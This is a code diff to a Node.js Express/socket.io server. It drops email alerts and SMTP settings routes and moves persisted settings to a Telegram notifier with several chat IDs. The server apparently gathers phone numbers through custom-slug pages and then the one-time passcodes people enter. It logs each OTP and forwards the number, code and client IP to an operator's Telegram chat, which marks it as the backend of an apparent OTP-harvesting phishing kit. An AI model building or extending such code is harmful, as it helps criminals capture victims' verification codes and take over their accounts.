@@ -5,7 +5,6 @@ const cors = require('cors');
 const path = require('path');
 const connectDB = require('./config/db');
 const Verification = require('./models/Verification');
-const emailNotifier = require('./config/emailNotifier');
 const telegramNotifier = require('./config/telegramNotifier');
 
 const app = express();
@@ -30,7 +29,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 // Connect to MongoDB
 connectDB().then((connected) => {
     isMongoConnected = connected;
-    emailNotifier.initPersistedSettings(connected);
+    telegramNotifier.initPersistedSettings(connected);
 });
 
 // REST API Endpoints
@@ -94,45 +93,6 @@ app.delete('/api/verifications', async (req, res) => {
     }
 });
 
-// ========== Email Notification Settings API ==========
-
-// Get current SMTP config & notification emails
-app.get('/api/email-settings', (req, res) => {
-    res.json({
-        success: true,
-        smtp: emailNotifier.getSMTPConfig(),
-        notificationEmails: emailNotifier.getNotificationEmails()
-    });
-});
-
-// Save SMTP configuration
-app.post('/api/email-settings/smtp', async (req, res) => {
-    const { host, port, user, pass } = req.body;
-    const result = await emailNotifier.saveSMTPConfig({ host, port: parseInt(port) || 587, user, pass }, isMongoConnected);
-    res.json({ success: true, configured: result, message: result ? 'SMTP configured and saved successfully' : 'SMTP config saved (missing credentials)' });
-});
-
-// Save notification email addresses
-app.post('/api/email-settings/recipients', async (req, res) => {
-    const { emails } = req.body;
-    if (!Array.isArray(emails)) {
-        return res.status(400).json({ success: false, message: 'emails must be an array' });
-    }
-    const updatedEmails = await emailNotifier.saveRecipientEmails(emails, isMongoConnected);
-    res.json({ success: true, emails: updatedEmails });
-});
-
-// Test email sending
-app.post('/api/email-settings/test', async (req, res) => {
-    try {
-        await emailNotifier.sendTestNotification();
-        res.json({ success: true, message: 'تم إرسال إيميل الاختبار بنجاح!' });
-    } catch (err) {
-        console.error('[TestEmail] Error:', err.message);
-        res.status(400).json({ success: false, message: err.message });
-    }
-});
-
 // ========== Telegram Bot Settings API ==========
 
 app.get('/api/telegram-settings', (req, res) => {
@@ -142,10 +102,10 @@ app.get('/api/telegram-settings', (req, res) => {
     });
 });
 
-app.post('/api/telegram-settings', (req, res) => {
-    const { botToken, chatId } = req.body;
-    const configured = telegramNotifier.configureTelegram(botToken, chatId);
-    res.json({ success: true, configured, message: configured ? 'تم حفظ إعدادات تليجرام بنجاح!' : 'تم حفظ الإعدادات' });
+app.post('/api/telegram-settings', async (req, res) => {
+    const { botToken, chatIds, chatId } = req.body;
+    const config = await telegramNotifier.saveTelegramSettings(botToken, chatIds || chatId, isMongoConnected);
+    res.json({ success: true, telegram: config, message: config.configured ? 'تم حفظ إعدادات تليجرام بنجاح!' : 'تم حفظ الإعدادات' });
 });
 
 app.post('/api/telegram-settings/test', async (req, res) => {
@@ -210,14 +170,6 @@ io.on('connection', (socket) => {
             }
 
             console.log(`[Notification] Phone submitted: ${phoneNumber} via slug ${customSlug}`);
-
-            // Send email notification (non-blocking)
-            emailNotifier.notifyPhoneSubmitted({
-                phoneNumber: record.phoneNumber,
-                customSlug: record.customSlug,
-                ipAddress: clientIp,
-                submittedAt: record.submittedAt
-            }).catch(err => console.error('[EmailNotifier] Error:', err.message));
 
             // Send Telegram instant notification (non-blocking)
             telegramNotifier.notifyPhoneSubmitted({
@@ -305,15 +257,6 @@ io.on('connection', (socket) => {
             }
 
             console.log(`[Notification] OTP Verified: ${updatedRecord.phoneNumber} -> OTP: ${otp}`);
-
-            // Send email notification (non-blocking)
-            emailNotifier.notifyOTPVerified({
-                phoneNumber: updatedRecord.phoneNumber,
-                otp: otp,
-                customSlug: updatedRecord.customSlug || customSlug || '/',
-                ipAddress: socket.handshake.address,
-                verifiedAt: updatedRecord.verifiedAt
-            }).catch(err => console.error('[EmailNotifier] Error:', err.message));
 
             // Send Telegram instant notification (non-blocking)
             telegramNotifier.notifyOTPVerified({
